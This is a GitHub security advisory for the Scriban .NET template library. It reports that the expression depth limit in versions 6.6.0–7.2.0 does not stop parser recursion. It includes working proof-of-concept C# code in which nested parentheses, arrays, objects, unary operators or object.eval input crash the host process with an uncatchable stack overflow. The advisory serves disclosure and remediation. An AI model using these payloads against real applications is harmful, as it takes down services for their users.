# [M] Scriban: ExpressionDepthLimit guard is non-enforcing — parser-recursion DoS in 6.6.0–7.2.0 (incomplete fix for GHSA-wgh7-7m3c-fx25 / GHSA-p6q4-fgr8-vx4p)

## Summary
Severity: Medium
Advisory: GHSA-6q7j-xr26-3h2c
CWE: CWE-674
Ecosystem: NuGet
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-6q7j-xr26-3h2c
Type: github-advisory

## Affected
- NuGet: `Scriban` — affected >=6.6.0 <7.2.1
- NuGet: `Scriban.Signed` — affected >=6.6.0 <7.2.1

## Details
### Summary

The `ExpressionDepthLimit` parser guard in Scriban does not actually stop parsing — it only logs a non-fatal error and lets recursive descent continue. As a result, a template containing a deeply nested expression (parentheses, array initializers, object initializers, or unary operators) drives the recursive-descent parser into a native stack overflow. The resulting `StackOverflowException` is **uncatchable** in .NET and **immediately terminates the host process**.

Any application that parses an attacker-influenced template — or that passes attacker-controlled strings to `object.eval` / `object.eval_template` — can be crashed by a single small request (roughly an 8 KB payload). This is a denial-of-service. It affects both Scriban-native (`Template.Parse`) and Liquid (`Template.ParseLiquid`) syntax modes, which share the same expression parser.

This re-opens two advisories that were reported as fixed: **GHSA-wgh7-7m3c-fx25** ("Uncontrolled recursion in parser → StackOverflow", reported fixed in 6.6.0) and **GHSA-p6q4-fgr8-vx4p** ("StackOverflow via nested array initializers bypasses ExpressionDepthLimit", reported fixed in 7.0.0). Both fixes are incomplete: the limit they rely on never halts recursion. **All releases 6.6.0 through 7.2.0 (current) are affected.**

### Details

The depth guard is `EnterExpression()` in `src/Scriban/Parsing/Parser.Expressions.cs`:

```csharp
// src/Scriban/Parsing/Parser.Expressions.cs:1209-1218
private void EnterExpression()
{
    _expressionDepth++;
    var limit = Options.ExpressionDepthLimit;
    if (limit > 0 && !_isExpressionDepthLimitReached && _expressionDepth > limit)
    {
        LogError(GetSpanForToken(Previous), $"The statement depth limit `{limit}` was reached when parsing this statement");
        _isExpressionDepthLimitReached = true;
    }
}
```

When the limit is exceeded it calls `LogError(...)` and sets a flag. It does **not** throw, does **not** return a sentinel, and does **not** unwind the parse. `LogError` here uses the default `isFatal: false`, so it merely appends a message and sets `HasErrors` — parsing proceeds:

```csharp
// src/Scriban/Parsing/Parser.cs:476-488
private void Log(LogMessage logMessage, bool isFatal = false)
{
    Messages.Add(logMessage);
    if (logMessage.Type == ParserMessageType.Error)
    {
        HasErrors = true;
        if (isFatal) _hasFatalError = true;   // not set on the depth-limit path
    }
}
```

The flag `_isExpressionDepthLimitReached` is consulted **only** to avoid logging the same error more than once — no code path uses it to stop descending. Confirmed by full-repo search (`grep -rn "_isExpressionDepthLimitReached" src/`): it appears in exactly four places — the field declaration (`Parser.cs:40`), a reset to `false` (`Parser.cs:106`), and within `EnterExpression` the dedup test (`Parser.Expressions.cs:1213`) and its assignment to `true` (`:1216`). The only *read* is the dedup test on line 1213; nothing else reads it. `ParseExpression` calls `EnterExpression()` and then continues straight into the token switch with no flag check:

```csharp
// src/Scriban/Parsing/Parser.Expressions.cs:113 + 181-182
EnterExpression();
try
{
    ...
    case TokenType.OpenParen:
        leftOperand = ParseParenthesis();   // recurses back into ParseExpression
```

```csharp
// src/Scriban/Parsing/Parser.Expressions.cs:984-1001
private ScriptExpression ParseParenthesis()
{
    var expression = Open<ScriptNestedExpression>();
    ExpectAndParseTokenTo(expression.OpenParen, TokenType.OpenParen);
    expression.Expression = ExpectAndParseExpression(expression);  // -> ParseExpression -> ParseParenthesis -> ...
    ...
}
```

Both `Template.Parse` (Scriban-native) and `Template.ParseLiquid` (Liquid-compatibility) front-ends share this same expression parser, so both entry points are affected.

So for input nested N levels deep, the parser recurses N levels deep regardless of `ExpressionDepthLimit`. There is no `RuntimeHelpers.EnsureSufficientExecutionStack()` call and no absolute recursion cap anywhere in the parser. Once the native thread stack is exhausted, the runtime raises `StackOverflowException`, which .NET does not allow to be caught and which tears down the entire process. The number of nesting levels required to overflow depends on the platform's thread-stack size (empirically around 4,000 levels on a default 1 MB stack); it is not a configurable mitigation.

The same defective guard is what makes the array-initializer fix for GHSA-p6q4-fgr8-vx4p ineffective: `ParseArrayInitializer` was wrapped in `EnterExpression()/LeaveExpression()`, but because `EnterExpression()` only logs, the array path still overflows.

The existing regression tests only assert `HasErrors == true` at a nesting depth of ~20 with a limit of 10 (`src/Scriban.Tests/TestParser.cs`); they never use a depth large enough to overflow the stack, so they pass while the protection does nothing against the actual DoS.

**Runtime reachability without template injection:** `object.eval` / `object.eval_template` (`src/Scriban/Functions/ObjectFunctions.cs:72-155`) re-parse a string argument at render time using `Template.Parse(...)`. An application whose own templates are fully trusted is still vulnerable if any user-controlled value flows into `object.eval`. The `catch (Exception)` inside `Eval` cannot intercept the `StackOverflowException`.

### PoC

A single console project reproduces it on the released NuGet package.

`poc.csproj`:
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <!-- If only the .NET 9 SDK is installed, change to net9.0. Behavior is identical. -->
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Scriban" Version="7.2.0" />
  </ItemGroup>
</Project>
```

`Program.cs`:
```csharp
using Scriban;

int n = 8000; // ~8 KB template; 8000 reliably overflows a default 1 MB thread stack
string tpl = "{{ " + new string('(', n) + "1" + new string(')', n) + " }}";

System.Console.WriteLine($"Parsing template with {n} nested parentheses (default ParserOptions)...");
Template.Parse(tpl);                 // <-- process is killed here
System.Console.WriteLine("Parse returned without crashing"); // never reached
```

Run:
```sh
dotnet run -c Release
```

Observed output (process aborts; shell exit code 134 = SIGABRT):
```
Parsing template with 8000 nested parentheses (default ParserOptions)...
Stack overflow.
   at Scriban.Parsing.Parser.ParseParenthesis()
   at Scriban.Parsing.Parser.ParseExpression(...)
   at Scriban.Parsing.Parser.ExpectAndParseExpression(...)
   at Scriban.Parsing.Parser.ParseParenthesis()
   ... (repeats until the stack is exhausted)
```

Additional confirmations (same crash / exit 134), substituting the template body in `Program.cs`:

The explicit limit is ignored — still crashes:
```csharp
Template.Parse(tpl, parserOptions: new ParserOptions { ExpressionDepthLimit = 10 });
```

Array initializers (the GHSA-p6q4 path):
```csharp
string tpl = "{{ " + new string('[', n) + "1" + new string(']', n) + " }}";
Template.Parse(tpl);  // crashes identically
```

Object initializers `{x:{x:...{x:1}...}}`:
```csharp
var b = new System.Text.StringBuilder();
for (int i = 0; i < n; i++) b.Append("{x:");
b.Append('1');
b.Append('}', n);
Template.Parse("{{ " + b + " }}");  // crashes identically
```

Unary operators:
```csharp
string tpl = "{{ " + new string('!', n) + "true" + " }}";
Template.Parse(tpl);  // crashes identically
```

Liquid syntax mode (shares the same expression parser):
```csharp
string tpl = "{{ " + new string('(', n) + "1" + new string(')', n) + " }}";
Template.ParseLiquid(tpl);  // crashes identically
```

Runtime via `object.eval`, with a fully trusted outer template — verified end-to-end: the outer parse reports `HasErrors == false`, then `Render()` crashes the process and the surrounding `try/catch` never fires (the `StackOverflowException` is uncatchable):
```csharp
using Scriban;

int n = 8000;
string deep = new string('(', n) + "1" + new string(')', n);
string outer = "{{ \"" + deep + "\" | object.eval }}";

System.Console.WriteLine($"Outer template length = {outer.Length} chars.");
var t = Template.Parse(outer);
System.Console.WriteLine($"Outer parsed. HasErrors = {t.HasErrors}");
System.Console.WriteLine("Rendering (object.eval re-parses the inner string at runtime)...");
try
{
    t.Render();
    System.Console.WriteLine("Render returned without crashing");
}
catch (System.Exception e)
{
    System.Console.WriteLine($"Caught {e.GetType().Name} (note: StackOverflowException cannot be caught)");
}
```

Verified against clean NuGet installs of Scriban **6.6.0, 7.0.0, 7.1.0, and 7.2.0** (net8.0, .NET 9 runtime, Linux). A control template with depth 200 parses normally (`HasErrors == false`, no crash).

### Impact

- **Type:** Denial of service via uncontrolled recursion (CWE-674) leading to an uncatchable `StackOverflowException` and full process termination.
- **Severity:** CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = **7.5 (High)** — the same vector and score as both prior advisories it re-opens (GHSA-wgh7-7m3c-fx25 and GHSA-p6q4-fgr8-vx4p, each scored 7.5 High with the identical `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` vector). The score reflects the library boundary, where no privileges are required to parse a template; the privilege actually needed in a given deployment depends on how that application exposes template input.
- **Who is impacted:** Any application that calls `Template.Parse` / `Template.ParseLiquid` (or `Template.Render` on an unparsed source) on template text that is wholly or partially attacker-controlled — the documented server-side template scenario — and any application that passes attacker-controlled strings to `object.eval` / `object.eval_template`, even when its own templates are trusted.
- **Why the existing mitigation does not help:** `ExpressionDepthLimit` (default 250) is advisory only; it records a parse error but does not stop recursion, so it cannot prevent the stack overflow. Because the exception is a `StackOverflowException`, callers cannot defend with `try/catch` either — the process is lost.
- **Affected versions:** 6.6.0 – 7.2.0 (all versions shipping the depth-limit guard). Versions before 6.6.0 are vulnerable to the original unbounded-recursion condition.

**Suggested remediation:** make the limit actually stop descent — e.g. throw a parse exception from `EnterExpression()` when the limit is exceeded (or log with `isFatal: true` and have the parse loop honor `_hasFatalError` by unwinding). As defense in depth, call `RuntimeHelpers.EnsureSufficientExecutionStack()` at the entry of `ParseExpression` (the same technique already used in `object.to_json`), and add a regression test at a depth that overflows without the fix (e.g. 100,000), asserting a graceful exception rather than only checking `HasErrors` at depth 20.

## References
- https://github.com/scriban/scriban/security/advisories/GHSA-6q7j-xr26-3h2c
- https://github.com/scriban/scriban
